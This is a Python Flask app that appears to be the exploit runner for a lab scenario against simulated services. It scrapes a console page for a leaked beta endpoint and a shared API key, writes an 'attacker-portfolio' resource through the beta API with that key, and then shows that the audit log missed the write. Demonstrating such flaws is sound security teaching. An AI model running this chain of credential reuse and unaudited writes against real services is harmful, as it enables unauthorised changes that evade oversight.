"""Service Catalog invisible write via a beta endpoint."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
CONSOLE = os.environ.get("CONSOLE_URL", "http://console:5000")
PROD = os.environ.get("PROD_URL", "http://prod-api:5000")
BETA = os.environ.get("BETA_URL", "http://beta-api:5000")
AUDIT = os.environ.get("AUDIT_URL", "http://audit-log:5000")

HTML = """<h1>Invisible Write via Beta Endpoint</h1>
<form method="post" action="/run"><button>Run chain</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    log = []
    page = requests.get(f"{CONSOLE}/", timeout=8).text
    if "aws242-servicecatalog-beta" in page:
        log.append("[1] console CSP leaks beta endpoint: aws242-servicecatalog-beta")
    if "credential" in page:
        log.append("[1b] console bundle leaks the shared credential X-Api-Key: valid-sigv4")
    r = requests.post(f"{BETA}/portfolios",
                      json={"name": "attacker-portfolio"},
                      headers={"X-Caller": "attacker", "X-Api-Key": "valid-sigv4"},
                      timeout=8)
    log.append(f"[2] beta write accepted: {r.json()}")
    pid = r.json().get("portfolio_id")
    if pid:
        read = requests.get(f"{BETA}/portfolios/{pid}",
                            headers={"X-Api-Key": "valid-sigv4"}, timeout=8)
        log.append(f"[2b] beta resource read: {read.text}")
    logs = requests.get(f"{AUDIT}/logs", timeout=8).json()
    log.append(f"[3] audit log entries: {logs['count']} -- the write is invisible")
    return HTML.replace("{{out}}", "\n".join(log))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
